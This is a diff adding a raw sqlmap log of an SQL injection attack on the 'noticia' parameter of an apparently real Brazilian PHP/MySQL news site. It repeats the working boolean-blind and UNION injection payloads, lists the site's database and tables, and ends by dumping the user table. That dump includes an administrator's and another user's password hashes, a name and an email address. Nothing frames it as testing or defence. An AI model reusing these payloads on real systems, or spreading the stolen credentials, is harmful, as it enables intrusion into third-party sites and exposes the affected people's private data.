@@ -1,0 +1,76 @@
+sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=79 AND 8821=8821&categoria=1
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: noticia=79 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170767a71,0x6467796e54694b474243746b6844734b7349674376754c646c46536b535658654870705847557279,0x716b6b7671),NULL,NULL,NULL-- jHxA&categoria=1
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] ebmsiste_mas
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=79 AND 8821=8821&categoria=1
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: noticia=79 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170767a71,0x6467796e54694b474243746b6844734b7349674376754c646c46536b535658654870705847557279,0x716b6b7671),NULL,NULL,NULL-- jHxA&categoria=1
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL 5
+Database: ebmsiste_mas
+[3 tables]
++-----------+
+| categoria |
+| noticias  |
+| usuarios  |
++-----------+
+
+Database: ebmsiste_mas
++-----------+---------+
+| Table     | Entries |
++-----------+---------+
+| noticias  | 202     |
+| categoria | 5       |
+| usuarios  | 2       |
++-----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: noticia=79 AND 8821=8821&categoria=1
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: noticia=79 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170767a71,0x6467796e54694b474243746b6844734b7349674376754c646c46536b535658654870705847557279,0x716b6b7671),NULL,NULL,NULL-- jHxA&categoria=1
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.5.38
+back-end DBMS: MySQL 5
+Database: ebmsiste_mas
+Table: usuarios
+[2 entries]
++----+-----------------+---------------+---------------------+----------------------------------+---------------------------+--------------+
+| id | cidade          | nome          | data                | senha                            | email                     | usuario      |
++----+-----------------+---------------+---------------------+----------------------------------+---------------------------+--------------+
+| 1  | <blank>         | Administrador | 0000-00-00 00:00:00 | 1f543a56ab2f84305f32989cb286998c | <blank>                   | ebmsiste_mas |
+| 2  | BraÃ§o do Norte | eremar        | 0000-00-00 00:00:00 | b988e1d0ab394871da3bc595c5616a14 | eremar@ebmsistemas.com.br | eremar       |
++----+-----------------+---------------+---------------------+----------------------------------+---------------------------+--------------+
+
